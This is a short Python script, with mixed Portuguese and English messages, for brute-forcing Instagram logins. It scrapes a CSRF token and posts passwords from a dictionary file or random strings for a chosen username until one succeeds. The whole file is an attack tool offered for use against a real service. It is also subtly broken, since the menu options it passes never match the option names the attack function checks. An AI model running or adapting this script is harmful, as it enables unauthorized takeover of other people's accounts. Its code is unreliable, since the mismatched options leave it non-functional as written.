
import requests
import time
import re
import random
import string

def generate_random_password(length, strength):
    if strength == 'weak':
        characters = string.ascii_letters
    elif strength == 'medium':
        characters = string.ascii_letters + string.digits
    else:  # strong
        characters = string.ascii_letters + string.digits + string.punctuation

    return ''.join(random.choice(characters) for _ in range(length))

def brute_force(username, password_source, dictionary=None, password_length=None, password_strength=None):
    login_url = 'https://www.instagram.com/accounts/login/'

    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

    try:
        response = session.get(login_url)
        csrf_token = re.search(r'"csrf_token":"(.*?)"', response.text).group(1)

        if password_source == 'dictionary':
            with open(f'{dictionary}.txt', 'r') as file:
                bruteforce = [line.strip() for line in file]

            for brute in bruteforce:
                login_data = {
                    'username': username,
                    'password': brute,
                    'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(login_url, data=login_data, allow_redirects=False)
                time.sleep(1)

                if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
                    print(f"Successful login - Username: {username}, Password: {brute}")
                    return
                else:
                    print(f"Unsuccessful login - Username: {username}, Password: {brute}")

        elif password_source == 'random':
            for _ in range(5):  # ou qualquer número de tentativas
                password = generate_random_password(password_length, password_strength)

                login_data = {
                    'username': username,
                    'password': password,
                    'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(login_url, data=login_data, allow_redirects=False)
                time.sleep(1)

                if 'location' in response.headers and response.headers['location'] == 'https://www.instagram.com/':
                    print(f"Login sucedido! - Usuario: {username}, Senha: {password}")
                    return
                else:
                    print(f"login não sucedido - Usuario: {username}, senha: {password}")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

def main():
    print("==== Força Bruta ====")
    username = input("Digite o nome de usuário: ")
    password_source = input("Tipo de senha (arquivo/aleatoria): ")

    if password_source == 'arquivo':
        dictionary = input("Nome do arquivo de dicionário (sem .txt): ")
        brute_force(username, password_source, dictionary=dictionary)
    elif password_source == 'aleatoria':
        length = int(input("Comprimento da senha: "))
        strength = input("Força da senha (weak/medium/strong): ")
        brute_force(username, password_source, password_length=length, password_strength=strength)
    else:
        print("Opção inválida.")

if __name__ == "__main__":
    main()
